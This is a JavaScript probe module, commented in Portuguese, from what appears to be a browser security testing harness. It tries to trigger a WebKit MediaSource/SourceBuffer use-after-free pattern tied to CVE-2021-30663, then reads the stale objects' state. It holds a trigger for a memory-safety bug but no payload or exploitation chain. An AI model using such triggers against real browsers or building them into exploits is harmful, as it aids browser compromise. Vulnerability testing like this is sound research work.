/**
 * SC_MEDIASOURCE_UAF.JS
 * Categoria : MEDIA — Use-After-Free
 * Alvo      : WebCore::MediaSource / SourceBuffer C++ lifecycle
 * Técnica   : Cria um MediaSource, adiciona um SourceBuffer, chama
 *             endOfStream() e remove o SourceBuffer enquanto o objeto
 *             JS ainda mantém referência. O MediaSource C++ pode ser
 *             coletado enquanto o SourceBuffer JS ainda está ativo.
 * Referência: CVE-2021-30663 (WebKit MediaSource UAF pattern)
 */

export default {
    id:          'MEDIASOURCE_UAF',
    category:    'MEDIA',
    risk:        'HIGH',
    description: 'SourceBuffer JS retém referência ao MediaSource C++ '
                + 'após endOfStream + remoção. Testa acesso pós-free.',

    /* ── estado interno ──────────────────────────────────────────────── */
    _ms:       null,
    _sb:       null,
    _video:    null,
    _objUrl:   null,
    _msState:  null,
    _sbMode:   null,

    supported: function() {
        return typeof MediaSource !== 'undefined'
            && MediaSource.isTypeSupported('video/mp4; codecs="avc1.42E01E"');
    },

    /* ── setup ──────────────────────────────────────────────────────── */
    setup: async function() {
        this._ms    = new MediaSource();
        this._objUrl = URL.createObjectURL(this._ms);

        this._video = document.createElement('video');
        this._video.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px';
        document.body.appendChild(this._video);
        this._video.src = this._objUrl;

        // Aguarda MediaSource abrir
        await new Promise((res, rej) => {
            this._ms.addEventListener('sourceopen', res, { once: true });
            this._ms.addEventListener('error',      rej, { once: true });
            setTimeout(rej, 3000);
        }).catch(() => {});

        if (this._ms.readyState !== 'open') return;

        try {
            this._sb = this._ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
            this._sb.mode = 'sequence';
            this._msState = this._ms.readyState;
            this._sbMode  = this._sb.mode;
        } catch(_) {}

        await new Promise(r => setTimeout(r, 20));
    },

    /* ── trigger ─────────────────────────────────────────────────────── */
    trigger: async function() {
        if (!this._ms || this._ms.readyState !== 'open') return;

        try {
            // Sinaliza fim — libera recursos internos de buffering
            this._ms.endOfStream();
        } catch(_) {}

        try {
            // Remove o SourceBuffer com referência JS ainda ativa
            if (this._sb) this._ms.removeSourceBuffer(this._sb);
        } catch(_) {}

        // Revoga o object URL — libera referência do motor ao MediaSource
        if (this._objUrl) URL.revokeObjectURL(this._objUrl);

        // Remove o video do DOM
        this._video?.remove();

        await new Promise(r => setTimeout(r, 30));
    },

    /* ── probes ──────────────────────────────────────────────────────── */
    probe: [
        // [0-3] estado do MediaSource após endOfStream
        s => s._ms?.readyState ?? 'null',
        s => s._ms?.duration   ?? 'null',
        s => s._ms?.sourceBuffers?.length ?? -1,
        s => typeof s._ms,

        // [4-7] SourceBuffer stale — leitura após remoção
        s => s._sb?.updating   ?? 'null',
        s => s._sb?.buffered?.length ?? -1,
        s => s._sb?.mode       ?? 'null',
        s => typeof s._sb,

        // [8-9] estado da baseline que capturamos
        s => s._msState,
        s => s._sbMode,

        // [10] video element state
        s => s._video?.readyState ?? -1,
        s => s._video?.error?.code ?? 'null',
    ],

    /* ── cleanup ─────────────────────────────────────────────────────── */
    cleanup: async function() {
        this._video?.remove();
        this._video  = null;
        this._ms     = null;
        this._sb     = null;
        this._objUrl = null;
        this._msState = null;
        this._sbMode  = null;
    }
};
